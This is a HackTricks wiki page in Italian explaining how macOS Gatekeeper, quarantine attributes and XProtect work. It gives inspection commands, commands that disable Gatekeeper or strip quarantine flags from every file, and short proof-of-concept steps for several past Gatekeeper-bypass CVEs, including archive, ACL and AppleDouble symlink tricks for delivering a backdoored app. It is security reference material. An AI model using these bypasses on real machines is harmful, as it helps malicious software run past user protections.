# macOS Gatekeeper / Quarantena / XProtect

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo di hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo di hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud)

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Gatekeeper

**Gatekeeper** è una funzionalità di sicurezza sviluppata per i sistemi operativi Mac, progettata per garantire che gli utenti **eseguano solo software attendibile** sui loro sistemi. Funziona **validando il software** che un utente scarica e cerca di aprire da **fonti esterne all'App Store**, come un'app, un plug-in o un pacchetto di installazione.

Il meccanismo chiave di Gatekeeper risiede nel suo processo di **verifica**. Controlla se il software scaricato è **firmato da un sviluppatore riconosciuto**, garantendo l'autenticità del software. Inoltre, verifica se il software è **notarizzato da Apple**, confermando che è privo di contenuti dannosi noti e che non è stato manomesso dopo la notarizzazione.

Inoltre, Gatekeeper rafforza il controllo e la sicurezza dell'utente **chiedendo agli utenti di approvare l'apertura** del software scaricato per la prima volta. Questa protezione aiuta a impedire agli utenti di eseguire involontariamente codice eseguibile potenzialmente dannoso che potrebbero aver scambiato per un file dati innocuo.

### Firme delle Applicazioni

Le firme delle applicazioni, conosciute anche come firme di codice, sono un componente critico dell'infrastruttura di sicurezza di Apple. Sono utilizzate per **verificare l'identità dell'autore del software** (lo sviluppatore) e per garantire che il codice non sia stato manomesso dall'ultima firma.

Ecco come funziona:

1. **Firmare l'Applicazione:** Quando uno sviluppatore è pronto a distribuire la propria applicazione, **firma l'applicazione utilizzando una chiave privata**. Questa chiave privata è associata a un **certificato che Apple rilascia allo sviluppatore** quando si iscrive al programma per sviluppatori Apple. Il processo di firma prevede la creazione di un hash crittografico di tutte le parti dell'applicazione e la crittografia di questo hash con la chiave privata dello sviluppatore.
2. **Distribuire l'Applicazione:** L'applicazione firmata viene quindi distribuita agli utenti insieme al certificato dello sviluppatore, che contiene la corrispondente chiave pubblica.
3. **Verificare l'Applicazione:** Quando un utente scarica e cerca di eseguire l'applicazione, il sistema operativo Mac utilizza la chiave pubblica del certificato dello sviluppatore per decrittare l'hash. Quindi ricalcola l'hash in base allo stato attuale dell'applicazione e confronta questo con l'hash decrittato. Se corrispondono, significa che **l'applicazione non è stata modificata** dall'ultima firma dello sviluppatore e il sistema permette all'applicazione di eseguirsi.

Le firme delle applicazioni sono una parte essenziale della tecnologia Gatekeeper di Apple. Quando un utente tenta di **aprire un'applicazione scaricata da Internet**, Gatekeeper verifica la firma dell'applicazione. Se è firmata con un certificato rilasciato da Apple a uno sviluppatore conosciuto e il codice non è stato manomesso, Gatekeeper permette all'applicazione di eseguirsi. In caso contrario, blocca l'applicazione e avvisa l'utente.

A partire da macOS Catalina, **Gatekeeper verifica anche se l'applicazione è stata notarizzata** da Apple, aggiungendo un ulteriore livello di sicurezza. Il processo di notarizzazione controlla l'applicazione per problemi di sicurezza noti e codice dannoso e, se questi controlli hanno esito positivo, Apple aggiunge un biglietto all'applicazione che Gatekeeper può verificare.

#### Verifica delle Firme

Quando si controlla un **campione di malware**, è sempre opportuno **verificare la firma** del binario poiché lo **sviluppatore** che l'ha firmato potrebbe essere già **associato** a **malware**.
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarizzazione

Il processo di notarizzazione di Apple funge da ulteriore salvaguardia per proteggere gli utenti da software potenzialmente dannoso. Coinvolge lo **sviluppatore che invia la propria applicazione per esame** al **Servizio di Notarizzazione di Apple**, che non va confuso con la Revisione dell'App. Questo servizio è un **sistema automatizzato** che esamina il software inviato alla ricerca di **contenuti dannosi** e potenziali problemi con la firma del codice.

Se il software **supera** questa ispezione senza sollevare preoccupazioni, il Servizio di Notarizzazione genera un biglietto di notarizzazione. Lo sviluppatore è quindi tenuto a **allegare questo biglietto al proprio software**, un processo noto come 'stapling'. Inoltre, il biglietto di notarizzazione viene anche pubblicato online dove Gatekeeper, la tecnologia di sicurezza di Apple, può accedervi.

Alla prima installazione o esecuzione del software da parte dell'utente, l'esistenza del biglietto di notarizzazione - che sia allegato all'eseguibile o trovato online - **informa Gatekeeper che il software è stato notarizzato da Apple**. Di conseguenza, Gatekeeper visualizza un messaggio descrittivo nella finestra di avvio iniziale, indicando che il software è stato sottoposto a controlli per contenuti dannosi da parte di Apple. Questo processo aumenta la fiducia dell'utente nella sicurezza del software che installano o eseguono sui propri sistemi.

### Enumerazione di GateKeeper

GateKeeper è sia **diversi componenti di sicurezza** che impediscono l'esecuzione di app non attendibili, sia **uno dei componenti**.

È possibile verificare lo **stato** di GateKeeper con:
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
Si noti che i controlli delle firme di GateKeeper vengono eseguiti solo per **file con l'attributo Quarantena**, non per ogni file.
{% endhint %}

GateKeeper verificherà se, in base alle **preferenze e alla firma**, un binario può essere eseguito:

<figure><img src="../../../.gitbook/assets/image (1147).png" alt=""><figcaption></figcaption></figure>

Il database che mantiene questa configurazione si trova in **`/var/db/SystemPolicy`**. È possibile controllare questo database come root con:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Nota come la prima regola sia terminata in "**App Store**" e la seconda in "**Developer ID**" e che nell'immagine precedente era **abilitato ad eseguire app dall'App Store e da sviluppatori identificati**.\
Se **modifichi** quell'impostazione su App Store, le regole di "**Developer ID notarizzati** scompariranno".

Ci sono anche migliaia di regole di **tipo GKE**:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Questi sono gli hash che provengono da **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** e **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`**

Oppure puoi elencare le informazioni precedenti con:
```bash
sudo spctl --list
```
Le opzioni **`--master-disable`** e **`--global-disable`** di **`spctl`** disabiliteranno completamente questi controlli delle firme:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Quando completamente abilitato, apparirà una nuova opzione:

<figure><img src="../../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

È possibile **verificare se un'app sarà consentita da GateKeeper** con:
```bash
spctl --assess -v /Applications/App.app
```
È possibile aggiungere nuove regole in GateKeeper per consentire l'esecuzione di determinate app con:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### File in quarantena

Al **scaricare** un'applicazione o un file, specifiche **applicazioni macOS** come i browser web o i client di posta elettronica **aggiungono un attributo di file esteso**, comunemente noto come "**flag di quarantena**," al file scaricato. Questo attributo funge da misura di sicurezza per **marcare il file** come proveniente da una fonte non attendibile (internet) e potenzialmente portatore di rischi. Tuttavia, non tutte le applicazioni aggiungono questo attributo, ad esempio, i comuni software client BitTorrent di solito evitano questo processo.

**La presenza di un flag di quarantena segnala la funzione di sicurezza Gatekeeper di macOS quando un utente tenta di eseguire il file**.

Nel caso in cui il **flag di quarantena non sia presente** (come nei file scaricati tramite alcuni client BitTorrent), le **verifiche di Gatekeeper potrebbero non essere eseguite**. Pertanto, gli utenti dovrebbero fare attenzione nell'aprire file scaricati da fonti meno sicure o sconosciute.

{% hint style="info" %}
**Verificare** la **validità** delle firme del codice è un processo **intensivo in termini di risorse** che include la generazione di **hash crittografici** del codice e di tutte le sue risorse incluse. Inoltre, verificare la validità del certificato comporta un **controllo online** ai server di Apple per vedere se è stato revocato dopo essere stato emesso. Per questi motivi, eseguire una verifica completa della firma del codice e della notarizzazione è **impraticabile da eseguire ogni volta che un'app viene avviata**.

Pertanto, queste verifiche vengono **eseguite solo quando si eseguono app con l'attributo in quarantena**.
{% endhint %}

{% hint style="warning" %}
Questo attributo deve essere **impostato dall'applicazione che crea/scarica** il file.

Tuttavia, i file che sono sandboxed avranno questo attributo impostato per ogni file che creano. E le app non sandboxed possono impostarlo da sole, o specificare la chiave [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) nell'**Info.plist** che farà sì che il sistema imposti l'attributo esteso `com.apple.quarantine` sui file creati.
{% endhint %}

È possibile **verificarne lo stato e abilitare/disabilitare** (richiede privilegi di root) con:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Puoi anche **verificare se un file ha l'attributo di quarantena esteso** con:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Verifica il **valore** degli **attributi** **estesi** e scopri l'app che ha scritto l'attributo di quarantena con:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
In realtà un processo "potrebbe impostare i flag di quarantena ai file che crea" (ho provato ad applicare il flag USER\_APPROVED in un file creato ma non lo applica):

<details>

<summary>Codice Sorgente per applicare i flag di quarantena</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

E **rimuovi** quell'attributo con:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
E trova tutti i file messi in quarantena con:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

Le informazioni sulla quarantena sono anche memorizzate in un database centrale gestito da LaunchServices in **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**.

#### **Quarantine.kext**

L'estensione del kernel è disponibile solo attraverso la **cache del kernel sul sistema**; tuttavia, è possibile scaricare il **Kernel Debug Kit da https://developer.apple.com/**, che conterrà una versione simbolizzata dell'estensione.

### XProtect

XProtect è una funzionalità integrata di **anti-malware** in macOS. XProtect **controlla ogni applicazione quando viene avviata o modificata per la prima volta nel confronto con il suo database** di malware conosciuti e tipi di file non sicuri. Quando si scarica un file tramite determinate app, come Safari, Mail o Messaggi, XProtect esegue automaticamente la scansione del file. Se corrisponde a un malware noto nel suo database, XProtect **impedirà l'esecuzione del file** e ti avviserà della minaccia.

Il database di XProtect è **aggiornato regolarmente** da Apple con nuove definizioni di malware, e questi aggiornamenti vengono scaricati e installati automaticamente sul tuo Mac. Ciò garantisce che XProtect sia sempre aggiornato con le ultime minacce conosciute.

Tuttavia, è importante notare che **XProtect non è una soluzione antivirus completa**. Controlla solo una specifica lista di minacce conosciute e non esegue la scansione on-access come la maggior parte del software antivirus.

Puoi ottenere informazioni sull'ultimo aggiornamento di XProtect eseguendo:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect si trova in una posizione protetta da SIP in **/Library/Apple/System/Library/CoreServices/XProtect.bundle** e all'interno del bundle puoi trovare le seguenti informazioni utilizzate da XProtect:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Consente al codice con quei cdhash di utilizzare i diritti legacy.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Elenco di plugin ed estensioni che non sono consentiti di caricare tramite BundleID e TeamID o indicando una versione minima.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Regole Yara per rilevare malware.
- **`XProtect.bundle/Contents/Resources/gk.db`**: Database SQLite3 con hash di applicazioni bloccate e TeamID.

Si noti che c'è un'altra App in **`/Library/Apple/System/Library/CoreServices/XProtect.app`** relativa a XProtect che non è coinvolta nel processo di Gatekeeper.

### Non Gatekeeper

{% hint style="danger" %}
Si noti che Gatekeeper **non viene eseguito ogni volta** che si esegue un'applicazione, solo _**AppleMobileFileIntegrity**_ (AMFI) verificherà solo le **firme del codice eseguibile** quando si esegue un'applicazione che è stata già eseguita e verificata da Gatekeeper.
{% endhint %}

Pertanto, in passato era possibile eseguire un'applicazione per memorizzarla con Gatekeeper, quindi **modificare file non eseguibili dell'applicazione** (come file Electron asar o NIB) e se non erano presenti altre protezioni, l'applicazione veniva **eseguita** con le **aggiunte maligne**.

Tuttavia, ora ciò non è più possibile perché macOS **impedisce la modifica dei file** all'interno dei bundle delle applicazioni. Quindi, se provi l'attacco [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md), scoprirai che non è più possibile abusarne perché dopo aver eseguito l'applicazione per memorizzarla con Gatekeeper, non sarai in grado di modificare il bundle. E se ad esempio cambi il nome della directory Contents in NotCon (come indicato nell'exploit), e quindi esegui il binario principale dell'applicazione per memorizzarlo con Gatekeeper, verrà generato un errore e non verrà eseguito.

## Bypass di Gatekeeper

Qualsiasi modo per aggirare Gatekeeper (riuscire a far scaricare qualcosa all'utente ed eseguirlo quando Gatekeeper dovrebbe impedirlo) è considerato una vulnerabilità in macOS. Di seguito sono riportati alcuni CVE assegnati a tecniche che hanno permesso di aggirare Gatekeeper in passato:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

È stato osservato che se l'**Utility Archivio** viene utilizzata per l'estrazione, i file con **percorsi superiori a 886 caratteri** non ricevono l'attributo esteso com.apple.quarantine. Questa situazione consente involontariamente a quei file di **aggirare i controlli di sicurezza di Gatekeeper**.

Consulta il [**rapporto originale**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) per ulteriori informazioni.

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Quando un'applicazione viene creata con **Automator**, le informazioni su ciò di cui ha bisogno per eseguire sono all'interno di `application.app/Contents/document.wflow` e non nell'eseguibile. L'eseguibile è solo un binario generico di Automator chiamato **Stub Applicazione Automator**.

Pertanto, è possibile fare in modo che `application.app/Contents/MacOS/Automator\ Application\ Stub` **punti con un link simbolico a un altro Stub Applicazione Automator all'interno del sistema** e eseguirà ciò che è all'interno di `document.wflow` (lo script) **senza attivare Gatekeeper** perché l'eseguibile effettivo non ha l'attributo di quarantena.

Esempio della posizione prevista: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Consulta il [**rapporto originale**](https://ronmasas.com/posts/bypass-macos-gatekeeper) per ulteriori informazioni.

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

In questo bypass è stato creato un file zip con un'applicazione che inizia a comprimere da `application.app/Contents` anziché da `application.app`. Pertanto, l'**attributo di quarantena** è stato applicato a tutti i **file da `application.app/Contents`** ma **non a `application.app`**, che era ciò che controllava Gatekeeper, quindi Gatekeeper è stato aggirato perché quando veniva attivato `application.app` **non aveva l'attributo di quarantena.**
```bash
zip -r test.app/Contents test.zip
```
Controlla il [**rapporto originale**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) per ulteriori informazioni.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Anche se i componenti sono diversi, lo sfruttamento di questa vulnerabilità è molto simile a quella precedente. In questo caso genereremo un Archivio Apple da **`application.app/Contents`** in modo che **`application.app` non otterrà l'attributo di quarantena** quando viene decompresso da **Archive Utility**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Controlla il [**rapporto originale**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) per ulteriori informazioni.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

L'ACL **`writeextattr`** può essere utilizzato per impedire a chiunque di scrivere un attributo in un file:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Inoltre, il formato file **AppleDouble** copia un file inclusi i suoi ACE.

Nel [**codice sorgente**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) è possibile vedere che la rappresentazione testuale dell'ACL memorizzata all'interno dell'xattr chiamato **`com.apple.acl.text`** verrà impostata come ACL nel file decompresso. Quindi, se hai compresso un'applicazione in un file zip con il formato file **AppleDouble** con un ACL che impedisce ad altri xattr di essere scritti su di esso... l'xattr di quarantena non è stato impostato nell'applicazione:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

Controlla il [**rapporto originale**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) per ulteriori informazioni.

Nota che questo potrebbe essere sfruttato anche con AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

È stato scoperto che **Google Chrome non impostava l'attributo di quarantena** per i file scaricati a causa di alcuni problemi interni di macOS.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

I formati file AppleDouble memorizzano gli attributi di un file in un file separato che inizia con `._`, questo aiuta a copiare gli attributi dei file **tra le macchine macOS**. Tuttavia, è stato notato che dopo la decompressione di un file AppleDouble, il file che inizia con `._` **non riceveva l'attributo di quarantena**.

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Essere in grado di creare un file che non avrà l'attributo di quarantena impostato, era **possibile eludere Gatekeeper.** Il trucco era **creare un'applicazione file DMG** utilizzando la convenzione dei nomi AppleDouble (iniziare con `._`) e creare un **file visibile come un collegamento simbolico a questo file nascosto** senza l'attributo di quarantena.\
Quando il **file dmg viene eseguito**, poiché non ha un attributo di quarantena, **eluderà Gatekeeper**.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### Impedire la xattr di quarantena

In un bundle ".app", se la xattr di quarantena non è aggiunta, quando viene eseguita **Gatekeeper non verrà attivato**.

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}
